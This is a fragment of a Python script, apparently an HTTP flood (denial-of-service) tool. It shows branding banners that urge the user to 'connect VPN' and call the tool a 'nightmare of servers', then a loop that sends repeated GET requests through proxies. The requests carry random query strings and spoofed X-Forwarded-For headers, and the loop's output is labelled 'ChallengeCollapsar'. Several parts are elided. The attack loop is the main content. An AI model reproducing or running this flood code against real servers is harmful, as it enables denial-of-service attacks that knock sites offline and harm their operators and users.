...
print(Fore.RED + "Code By Cyber Zain - 2024/05/19")
print(" ")
print("Version 2.0  https://github.com/T3AmSyNc\n") 

time.sleep(1)
print (Fore.BLUE+"> AHMAD OFFICIAL")
time.sleep(1)
print (Fore.BLUE+"> Current build: 2.0")
time.sleep(3)
print (Fore.GREEN+"> Coded by Ahmad Gaur")
time.sleep(2)
print (Fore.BLUE+"> SYNC MEMBERS:")
print (Fore.CYAN+">>>WARNING FROM SYNC")
print (Fore.CYAN+">>>REMEMBER TO CONNECT VPN")
print (Fore.CYAN+">>>NIGHTMARE OF SERVERS")
        ...
        try:
            ...
            try:
                for _ in range(per):
                    ...
                    s.send(str("GET "+uu+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+host+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())
                print(Fore.CYAN + "ChallengeCollapsar From ~[" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.CYAN + "]") #Code By ZAIN
            except:
                s.close()
